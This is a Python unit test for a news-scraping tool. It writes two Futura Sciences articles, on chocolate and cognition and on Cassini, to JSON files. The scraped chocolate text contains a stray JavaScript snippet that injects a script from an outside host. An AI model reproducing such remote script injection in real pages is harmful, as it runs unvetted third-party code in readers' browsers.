# -*- coding: utf-8 -*-

from g4_utils_v32 import get_hash, already_exists,add_to_index,create_json
import json
import os
import datetime

chemin = "C:/Users/marin/Desktop/Unit test/"
def test_create_json():
    # creation of the JSON object
    
    jsons = []
    new_article = {
            "title": "Le chocolat, c'est bon pour le cerveau",
            "newspaper": "Futura Sciences",
            "author": "Marie-Celine Jacquier",
            "date_publi": "2017-04-17",
            "content": "Le 1 er  octobre, nous fetons la journee mondiale du cacao et du chocolat. L'occasion de rappeler que cet aliment n'est pas que bon pour les papilles des gourmands : il a de nombreuses vertus pour la sante ! Les benefices cardiovasculaires du cacao ont deja ete demontres a plusieurs reprises, et seraient lies a ses flavanols (catechine et epicatechine, des flavonoides). Il serait bon aussi pour le cerveau. Une etude parue en 2016 avait revele que le chocolat stimule la matiere grise. Ce qu'il faut retenir 968 personnes agees de 23 a 98 ans qui ont participe a une vaste etude ont ete testees sur leurs habitudes alimentaires et leurs performances cognitives. Resultat :  << les gens qui mangent du chocolat au moins une fois par semaine ont tendance a avoir de meilleures performances cognitives >> . Flavanols et methylxanthines sont probablement a l'origine de ces ameliorations. Le chocolat est bon aussi pour la pression sanguine. Article paru le 17 avril 2017 Accro au  chocolat  ? C'est peut-etre le signe d'une bonne sante cerebrale ! Si les  benefices du chocolat  et du  cacao  sur la sante cardiovasculaire sont averes, leurs effets sur le  cerveau  sont moins connus. Largement consomme dans le monde (7,2 millions de tonnes en 2009), le chocolat est un petit plaisir pour les papilles. Alors s'il est bon pour la sante, pourquoi s'en priver ? Au milieu des annees 1970, Merrill Elias, de l'universite du Maine (Etats-Unis), a commence a suivre les  capacites cognitives  d'un millier de personnes dans l'Etat de New York. L'objectif initial etait d'etudier le lien entre la pression sanguine et les performances cognitives dans le cadre de la  Maine-Syracuse Longitudinal Study  (MSLS). Plus tard, les chercheurs ont eu l'idee de s'interesser a l'alimentation des participants. Ils ont donc incorpore un questionnaire sur leurs  habitudes alimentaires , pendant la sixieme  vague  de recolte de donnees, entre 2001 et 2006. 968 personnes agees de 23 a 98 ans ont participe et ont subi differents tests cognitifs. Cette recherche a ete realisee en collaboration avec Georgina Crichton, une chercheuse en nutrition de l'universite d'Australie meridionale, et Ala'a Alkerwi, epidemiologiste a l'institut de sante du Luxembourg. L'etude a ete publiee dans la revue   Appetite . Resultats : les chercheurs ont trouve des associations positives significatives entre les apports en chocolat et les performances cognitives. Comme l'explique Merrill Elias dans  The Washington Post ,  << nous avons constate que les gens qui mangent du chocolat au moins une fois par semaine ont tendance a avoir de meilleures performances cognitives. C'est significatif - cela touche un certain nombre de domaines >>. Les feves de cacao apportent des flavanols. (c)  Verity Snaps Photography , Shutterstock                               Flavanols et methylxanthines, des molecules benefiques dans le cacao Plus precisement, le fait de manger du chocolat etait associe a une meilleure memoire visuo-spatiale, une meilleure  memoire  de travail et un meilleur raisonnement abstrait. Pour Georgina Crichton, ceci peut se traduire dans differentes taches du quotidien  << telles que se souvenir d'un numero de telephone ou de votre liste de courses ou d'etre en mesure de faire deux choses a la fois, comme parler et conduire en meme temps >>.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les raisons exactes de ces associations ne sont pas connues mais il y a plusieurs hypotheses. Par exemple le  cacao  et le chocolat contiennent des  flavanols  : 100 g de chocolat noir en contiennent environ 100 mg. Comme l'epicatechine, ils sont un sous-groupe de  flavonoides , des  polyphenols . Ils ont un effet positif sur le cerveau.  De plus, d'autres composes psychoactifs sont presents dans le chocolat : les methylxanthines (theobromine) et la  cafeine  qui stimulent le cerveau. Enfin, le cacao ameliore le  flux sanguin  vers le cerveau, ce qui augmente ses performances : fonctions cardiovasculaire et cerebrale sont donc intimement liees.  Merrill Elias conclut :  << Je pense que ce que nous pouvons dire pour le moment est que vous pouvez manger de petites quantites sans culpabilite si vous ne substituez pas le chocolat a une alimentation saine et equilibree normale >>. Du chocolat imprime en 3D sur un gateau                       L'ingenieur Anjan Contractor filme son coup d'essai : il a transforme une imprimante 3D pour deposer du chocolat sur un gateau. Cela interesse de pres la Nasa, qui espere creer une machine sophistiquee preparant des plats pour les astronautes.",
            "theme": "sante"
        }
    jsons.append(new_article)
    new_article = {
            "title": "Ce que Cassini nous a appris de Saturne",
            "newspaper": "Futura Sciences",
            "author": "Remy Decourt",
            "date_publi": "2017-10-02",
            "content": "Sandrine Guerlet, astrophysicienne au Laboratoire de meteorologie dynamique (LMD), a l'universite Pierre-et-Marie-Curie, et specialiste de l'etude des atmospheres terrestre et planetaires, ...",
            "theme": "autre"
        }
    jsons.append(new_article)
    sources = "FuturaSciences/"
    abb = "fusc"
    # creation of the file
    if (int(datetime.datetime.now().month)<10) : 
        month = "0"+str(datetime.datetime.now().month)
    else : 
        month = str(datetime.datetime.now().month)
    create_json(chemin+"Test_Creation_json_FuturaSciences/", jsons, sources,abb )
    assert os.path.isfile(chemin+"Test_Creation_json_FuturaSciences/"+sources+"art_"+str(abb)+"_1_"+str(datetime.datetime.now().year)+"-"+month+"-"+str(datetime.datetime.now().day)+"_robot.json") == True
    assert os.path.isfile(chemin+"Test_Creation_json_FuturaSciences/"+sources+"art_"+str(abb)+"_2_"+str(datetime.datetime.now().year)+"-"+month+"-"+str(datetime.datetime.now().day)+"_robot.json") == True
 